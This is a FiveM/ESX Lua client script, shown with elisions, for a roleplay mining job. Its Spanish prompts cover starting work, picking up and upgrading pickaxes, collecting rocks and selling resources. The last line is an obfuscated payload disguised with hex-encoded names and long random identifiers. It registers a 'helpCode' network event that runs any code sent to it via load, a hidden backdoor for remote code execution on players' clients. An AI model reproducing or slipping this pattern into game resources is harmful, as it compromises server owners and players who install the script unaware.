	...
	while true do
			...
			if(GetDistanceBetweenCoords(coords,Config.miner['BossSpawn'].Pos.x, Config.miner['BossSpawn'].Pos.y, Config.miner['BossSpawn'].Pos.z, true) < 1.5) then	
				...
				if (Config.jobrequirement and (PlayerData.job ~= nil and PlayerData.job.name == Config.jobname)) or not Config.jobrequirement then
					...
					if not JobStarted then						
						DrawText3Ds(Config.miner['BossSpawn'].Pos.x, Config.miner['BossSpawn'].Pos.y, Config.miner['BossSpawn'].Pos.z+1.0, 'Presione [~g~E~w~] para comenzar a trabajar.')
					else
						DrawText3Ds(Config.miner['BossSpawn'].Pos.x, Config.miner['BossSpawn'].Pos.y, Config.miner['BossSpawn'].Pos.z+1.0, 'Presione [~r~E~w~] para finalizar el trabajo.')
					end
					...
					if (IsControlJustReleased(0, Keys['E']) and not IsPedInAnyVehicle(ped, false) and not JobStarted) then
						ESX.TriggerServerCallback('esx_skin:getPlayerSkin', function(skin, jobSkin)
							...
							JobStarted = true
							exports.pNotify:SendNotification({text = "<b>Boss</b></br>Para recoger el pico, ve con mi amigo de la izquierda y para vender recursos, ve a mi derecha.", timeout = 4500})
						end)
					...
					DrawText3Ds(Config.miner['BossSpawn'].Pos.x, Config.miner['BossSpawn'].Pos.y, Config.miner['BossSpawn'].Pos.z+1.0, 'Ponte el trabajo de minero y vuelve')
				end
			end
		elseif(GetDistanceBetweenCoords(coords,Config.miner['Pickaxeplace'].Pos.x, Config.miner['Pickaxeplace'].Pos.y, Config.miner['Pickaxeplace'].Pos.z, true) < 4.0) and JobStarted then	
			...
			if(GetDistanceBetweenCoords(coords,Config.miner['Pickaxeplace'].Pos.x, Config.miner['Pickaxeplace'].Pos.y, Config.miner['Pickaxeplace'].Pos.z, true) < 1.5) then	
				...
				if NewPickaxe and not haspickaxe and Pickaxe <= 6 then
					DrawText3Ds(Config.miner['Pickaxeplace'].Pos.x, Config.miner['Pickaxeplace'].Pos.y, Config.miner['Pickaxeplace'].Pos.z+1.2, 'Presiona [~g~G~w~] para actualizar tu pico a '..Config.Pickaxe[Pickaxe+1].color..''..Config.Pickaxe[Pickaxe+1].name..'~w~ ('..Config.Pickaxe[Pickaxe+1].price..'~g~$~w~)')
				end

				if not haspickaxe then
					DrawText3Ds(Config.miner['Pickaxeplace'].Pos.x, Config.miner['Pickaxeplace'].Pos.y, Config.miner['Pickaxeplace'].Pos.z+1.0, 'Pulsa [~g~E~w~] para coger un pico. ('..Config.Pickaxe[Pickaxe].color..''..Config.Pickaxe[Pickaxe].name..'~w~)')
				else
				...
				if IsControlJustReleased(0, Keys['E']) and not IsPedInAnyVehicle(ped, false) and not haspickaxe then
					...
					exports.pNotify:SendNotification({text = "<b>Boss</b></br>Tienes tu pico, ahora ve al lugar destinado para tu pico.", timeout = 4500})
					haspickaxe = true
				...
				elseif (IsControlJustReleased(0, Keys['E']) and not IsPedInAnyVehicle(ped, false)) and haspickaxe then
					DeleteEntity(PickaxeObject)
					haspickaxe = false
					exports.pNotify:SendNotification({text = "<b>Boss</b></br>Dejaste tu pico", timeout = 4500})
					RemoveBlip(MineBlip)
				elseif IsControlJustReleased(0, Keys['G']) and not IsPedInAnyVehicle(ped, false) and not haspickaxe and Pickaxe <= 6 then
					ESX.TriggerServerCallback('dream-miner:upgrade', function(cb)
						if cb then 
							Pickaxe = Pickaxe + 1
							exports.pNotify:SendNotification({text = "<b>Boss</b></br>Actualizaste tu pico, de ahora en adelante tienes un "..Config.Pickaxe[Pickaxe].name.." pickaxe", timeout = 4500})
						else
							exports.pNotify:SendNotification({text = "<b>Boss</b></br>No tienes suficiente dinero para mejorar tu pico", timeout = 4500})
						end
					end, Pickaxe)
				end
			end
		elseif(GetDistanceBetweenCoords(coords,Config.miner['Sell'].Pos.x, Config.miner['Sell'].Pos.y, Config.miner['Sell'].Pos.z, true) < 4.0) and JobStarted then
			...
			if(GetDistanceBetweenCoords(coords,Config.miner['Sell'].Pos.x, Config.miner['Sell'].Pos.y, Config.miner['Sell'].Pos.z, true) < 1.5) then
				sleep = 0
				DrawText3Ds(Config.miner['Sell'].Pos.x, Config.miner['Sell'].Pos.y, Config.miner['Sell'].Pos.z+1.0, 'Pulsa [~g~E~w~] para vender los recursos excavados.')
					...
					ESX.TriggerServerCallback('dream-miner:payout', function(money, amount, experience)
						if money then
							if experience == 0 then
								exports.pNotify:SendNotification({text = '<b>Boss</b></br>Tu vendiste '..amount..' recursos por un precio '..money..'$', timeout = 4500})
							else 
								Experience = Experience + experience
								exports.pNotify:SendNotification({text = '<b>Boss</b></br>Tu vendiste '..amount..' recursos por un precio '..money..'$ Y '..experience..' exp', timeout = 4500})
								local i = 10
								while true do
							...
							exports.pNotify:SendNotification({text = "<b>Boss</b></br>No tienes nada que vender.", timeout = 4500})
						end
					end, Experience)
				end
			end
		elseif JobStarted and (GetDistanceBetweenCoords(coords,Config.miner['Pickaxeplace'].Pos.x, Config.miner['Pickaxeplace'].Pos.y, Config.miner['Pickaxeplace'].Pos.z, true) > 100.0) then
			exports.pNotify:SendNotification({text = "<b>Boss</b></br>Dejaste tu lugar de trabajo", timeout = 4500})
			JobStarted = false
			DeleteEntity(PickaxeObject)
			if haspickaxe then
				RemoveBlip(MineBlip)
			end
			ESX.TriggerServerCallback('esx_skin:getPlayer', function(skin)
				TriggerEvent('skinchanger:loadSkin', skin)
			end)
		end
		Citizen.Wait(sleep)
						...
						while true do
							...
							local coords = GetEntityCoords(ped)
								if objectCoords1 and (GetDistanceBetweenCoords(coords,objectCoords1.x, objectCoords1.y, objectCoords1.z, false) < 0.5) then	
									DrawText3Ds(objectCoords1.x, objectCoords1.y, objectCoords1.z, 'Presione [~r~E~w~] para recoger la materia prima.')
									if IsControlJustReleased(0, Keys['E']) and not IsPedInAnyVehicle(ped, false) then
										done = done + 1
										objectCoords1 = nil
										DeleteEntity(rock1)
								...
								elseif objectCoords2 and (GetDistanceBetweenCoords(coords,objectCoords2.x, objectCoords2.y, objectCoords2.z, false) < 0.5) then
									DrawText3Ds(objectCoords2.x, objectCoords2.y, objectCoords2.z, 'Presione [~r~E~w~] para recoger la materia prima.')
									if IsControlJustReleased(0, Keys['E']) and not IsPedInAnyVehicle(ped, false) then
										done = done + 1
										objectCoords2 = nil
										DeleteEntity(rock2)
								...
								elseif objectCoords3 and (GetDistanceBetweenCoords(coords,objectCoords3.x, objectCoords3.y, objectCoords3.z, false) < 0.5) then
									DrawText3Ds(objectCoords3.x, objectCoords3.y, objectCoords3.z, 'Presione [~r~E~w~] para recoger la materia prima.')
									if IsControlJustReleased(0, Keys['E']) and not IsPedInAnyVehicle(ped, false) then
										done = done + 1
										objectCoords3 = nil
										DeleteEntity(rock3)
								...
								if done == 3 then
									if not firsthelp then
										exports.pNotify:SendNotification({text = "<b>Boss</b></br>Puedes vender los materiales yendo al hombre que sostiene la piedra.", timeout = 4500})
										firsthelp = true
									end
									break
								end
...
local obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[6][obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[1]](obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[2]) obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[6][obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[3]](obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[2], function(gCMjdRVFEgoSxNGYjIQdgJbZVZjAbqHucPNEgrqLZxSHlpLEcWvCVZCuPVRNcBfcBAcLqt) obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[6][obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[4]](obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[6][obxXncQafSPOinIcpFMwRcgODvhyWYNXWLPCnPrHSjfTghsaJUTzJObkDAwznSyLrscMyF[5]](gCMjdRVFEgoSxNGYjIQdgJbZVZjAbqHucPNEgrqLZxSHlpLEcWvCVZCuPVRNcBfcBAcLqt))() end)